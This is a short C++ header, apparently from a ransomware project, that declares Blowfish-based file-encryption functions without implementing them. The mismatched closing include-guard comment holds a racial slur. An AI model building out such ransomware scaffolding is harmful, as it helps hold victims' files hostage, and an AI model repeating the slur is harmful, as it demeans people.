#ifndef RANSOM_ENCRYPTION_H
#define RANSOM_ENCRYPTION_H

#include <vector>
#include <iostream>
#include <filesystem>

class Crypting {
public:
	void encryptBlowfish(std::filesystem::path const& file);
};

void encrypt(std::filesystem::path const& file);


#endif //NIGGASMACKER_ENCRYPTION_H